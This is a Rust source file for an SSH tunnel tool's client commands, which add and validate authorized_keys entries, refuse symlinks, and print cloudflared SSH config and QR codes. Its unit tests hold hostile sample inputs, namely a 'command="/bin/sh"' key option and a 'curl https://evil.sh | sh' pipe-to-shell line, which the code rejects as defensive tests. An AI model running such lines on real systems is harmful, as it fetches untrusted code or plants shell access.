use crate::config::{self, Config};
use crate::ui;
use anyhow::{Context, Result, bail};
use std::fs;
use std::io::Read;

pub fn add(
    cfg: &Config,
    name: &str,
    key_file: Option<&str>,
    qr: bool,
    identity: Option<&str>,
) -> Result<()> {
    if let Some(raw) = read_key(key_file)? {
        match add_key(cfg, &raw)? {
            Some(fingerprint) => {
                println!("{} added public key for {}", ui::ok(), name);
                println!("  {fingerprint}");
            }
            None => println!("{} key already present", ui::warn()),
        }
    }

    if let Some(id) = identity
        && id.chars().any(|c| c.is_whitespace() || c.is_control())
    {
        anyhow::bail!("--identity must not contain whitespace or control characters");
    }

    let block = ssh_block(cfg, identity);
    println!();
    println!("{}", ui::bold(&format!("Client: {name}")));
    println!("Add this to ~/.ssh/config on the device:");
    println!();
    for line in block.lines() {
        println!("  {line}");
    }
    println!();
    println!(
        "Then connect with: {}",
        ui::bold(&format!("ssh {}", cfg.alias()))
    );
    println!();
    println!(
        "{}",
        ui::dim("The device also needs the `cloudflared` binary in PATH.")
    );

    if key_file.is_none() {
        println!();
        println!("No key registered yet. On the device, run:");
        println!("  cat ~/.ssh/id_ed25519.pub");
        println!("Then here:");
        println!("  ssh-tunnel client add {name} --key-file -");
    }

    if qr {
        println!();
        println!("{}", ui::dim("Scan for the connection command:"));
        let cmd = format!(
            "ssh -o ProxyCommand=\"cloudflared access ssh --hostname %h\" {}@{}",
            cfg.user, cfg.hostname
        );
        print_qr(&cmd)?;
    }
    Ok(())
}

pub fn list(cfg: &Config) -> Result<()> {
    let path = cfg.authorized_keys();
    if !path.exists() {
        println!("no authorized_keys at {}", path.display());
        return Ok(());
    }
    let path_str = path.to_str().context("authorized_keys path is not UTF-8")?;
    let out = std::process::Command::new("ssh-keygen")
        .args(["-lf", path_str])
        .output()
        .context("running ssh-keygen")?;
    if !out.status.success() {
        bail!(
            "ssh-keygen failed: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    print!("{}", String::from_utf8_lossy(&out.stdout));
    Ok(())
}

fn read_key(key_file: Option<&str>) -> Result<Option<String>> {
    const MAX: u64 = 64 * 1024;
    match key_file {
        None => Ok(None),
        Some("-") => {
            let mut s = String::new();
            std::io::stdin()
                .take(MAX)
                .read_to_string(&mut s)
                .context("reading public key from stdin")?;
            Ok(Some(s))
        }
        Some(path) => {
            let text = fs::read_to_string(path).with_context(|| format!("reading {path}"))?;
            if text.len() as u64 >= MAX {
                bail!("{path} is too large to be a public key");
            }
            Ok(Some(text))
        }
    }
}

/// One line, no control characters, and it must be a key `ssh-keygen` accepts.
/// Returns the key and its fingerprint.
fn parse_key(raw: &str) -> Result<(String, String)> {
    let key = key_line(raw)?;
    let fingerprint = validate_key(key)?;
    Ok((key.to_string(), fingerprint))
}

/// Pick the single key line out of pasted input and reject anything that
/// could smuggle `authorized_keys` options or extra entries.
fn key_line(raw: &str) -> Result<&str> {
    let key = raw
        .lines()
        .map(str::trim)
        .find(|l| l.starts_with("ssh-") || l.starts_with("ecdsa-") || l.starts_with("sk-"))
        .context("no SSH public key found in input")?;

    if key.chars().any(|c| c.is_control()) {
        bail!("public key contains control characters");
    }
    // authorized_keys accepts options before the key type; only allow a bare key.
    if key.contains('"') || key.contains("command=") || key.contains("from=") {
        bail!("refusing a key with embedded authorized_keys options");
    }
    Ok(key)
}

/// Ask `ssh-keygen` whether the line really is a key; it returns the fingerprint.
fn validate_key(key: &str) -> Result<String> {
    let dir = std::env::temp_dir().join(format!(
        "ssh-tunnel-key-{}-{}",
        std::process::id(),
        line_counter()
    ));
    fs::write(&dir, format!("{key}\n")).context("writing temporary key file")?;
    crate::config::set_mode(&dir, 0o600)?;
    let out = std::process::Command::new("ssh-keygen")
        .args(["-l", "-f"])
        .arg(&dir)
        .output();
    let _ = fs::remove_file(&dir);

    let out = out.context("ssh-keygen is required to validate public keys")?;
    if !out.status.success() {
        bail!(
            "not a valid SSH public key: {}",
            String::from_utf8_lossy(&out.stderr).trim()
        );
    }
    Ok(String::from_utf8_lossy(&out.stdout).trim().to_string())
}

fn line_counter() -> u64 {
    use std::sync::atomic::{AtomicU64, Ordering};
    static N: AtomicU64 = AtomicU64::new(0);
    N.fetch_add(1, Ordering::Relaxed)
}

fn add_key(cfg: &Config, raw: &str) -> Result<Option<String>> {
    let (key, fingerprint) = parse_key(raw)?;

    let dir = config::home().join(".ssh");
    fs::create_dir_all(&dir)?;
    config::set_mode(&dir, 0o700)?;

    let path = cfg.authorized_keys();
    // Never follow a symlink into somewhere else.
    if let Ok(meta) = fs::symlink_metadata(&path)
        && !meta.file_type().is_file()
    {
        bail!(
            "{} is not a regular file; refusing to write to it",
            path.display()
        );
    }

    let mut text = if path.exists() {
        fs::read_to_string(&path)?
    } else {
        String::new()
    };
    if !text.is_empty() && !text.ends_with('\n') {
        text.push('\n');
    }
    if text.lines().any(|l| l.trim() == key) {
        return Ok(None);
    }

    // Keep one level of undo before the first change to the file.
    if path.exists() {
        let backup = path.with_extension("bak");
        fs::copy(&path, &backup).with_context(|| format!("backing up {}", path.display()))?;
        config::set_mode(&backup, 0o600)?;
    }

    text.push_str(&key);
    text.push('\n');
    write_authorized_keys(&path, &text)?;
    Ok(Some(fingerprint))
}

/// Open with O_NOFOLLOW so a symlink swapped in after the check cannot redirect
/// the write somewhere else.
fn write_authorized_keys(path: &std::path::Path, text: &str) -> Result<()> {
    use std::io::Write;

    #[cfg(unix)]
    let mut file = {
        use std::os::unix::fs::OpenOptionsExt;
        fs::OpenOptions::new()
            .write(true)
            .create(true)
            .truncate(true)
            .mode(0o600)
            .custom_flags(libc::O_NOFOLLOW)
            .open(path)
            .with_context(|| format!("opening {} (symlinks are refused)", path.display()))?
    };
    #[cfg(not(unix))]
    let mut file = fs::OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(true)
        .open(path)
        .with_context(|| format!("opening {}", path.display()))?;

    file.write_all(text.as_bytes())?;
    file.flush()?;
    config::set_mode(path, 0o600)?;
    Ok(())
}

fn ssh_block(cfg: &Config, identity: Option<&str>) -> String {
    let identity = identity.unwrap_or("~/.ssh/id_ed25519");
    format!(
        "Host {alias}\n    HostName {hostname}\n    User {user}\n    IdentityFile {identity}\n    ProxyCommand cloudflared access ssh --hostname %h\n    ServerAliveInterval 30\n    ServerAliveCountMax 3",
        alias = cfg.alias(),
        hostname = cfg.hostname,
        user = cfg.user,
        identity = identity,
    )
}

fn print_qr(text: &str) -> Result<()> {
    let code = qrcode::QrCode::new(text.as_bytes())
        .map_err(|e| anyhow::anyhow!("QR encode failed: {e:?}"))?;
    let rendered = code
        .render::<qrcode::render::unicode::Dense1x2>()
        .quiet_zone(true)
        .build();
    println!("{rendered}");
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::key_line;

    #[test]
    fn picks_the_key_line() {
        let raw = "some banner\nssh-ed25519 AAAAC3Nza test\n";
        assert_eq!(key_line(raw).unwrap(), "ssh-ed25519 AAAAC3Nza test");
    }

    #[test]
    fn rejects_authorized_keys_options() {
        let raw = "command=\"/bin/sh\" ssh-ed25519 AAAAC3Nza";
        assert!(key_line(raw).is_err());
    }

    #[test]
    fn rejects_the_wrong_key_type_position() {
        let raw = "from=\"10.0.0.1\" ssh-ed25519 AAAAC3Nza";
        assert!(key_line(raw).is_err());
    }

    #[test]
    fn rejects_no_key_at_all() {
        assert!(key_line("curl https://evil.sh | sh").is_err());
    }
}

#[cfg(all(test, unix))]
mod write_tests {
    use super::write_authorized_keys;
    use std::fs;

    fn tmp(name: &str) -> std::path::PathBuf {
        std::env::temp_dir().join(format!("ssh-tunnel-test-{}-{name}", std::process::id()))
    }

    #[test]
    fn writes_and_chmods() {
        let path = tmp("plain");
        let _ = fs::remove_file(&path);
        write_authorized_keys(&path, "ssh-ed25519 AAAA x\n").unwrap();
        assert_eq!(fs::read_to_string(&path).unwrap(), "ssh-ed25519 AAAA x\n");
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(
                fs::metadata(&path).unwrap().permissions().mode() & 0o777,
                0o600
            );
        }
        fs::remove_file(&path).unwrap();
    }

    #[test]
    fn refuses_a_symlink() {
        let target = tmp("target");
        let link = tmp("link");
        let _ = fs::remove_file(&link);
        fs::write(&target, "original\n").unwrap();
        std::os::unix::fs::symlink(&target, &link).unwrap();

        assert!(write_authorized_keys(&link, "pwned\n").is_err());
        assert_eq!(fs::read_to_string(&target).unwrap(), "original\n");

        fs::remove_file(&link).unwrap();
        fs::remove_file(&target).unwrap();
    }
}
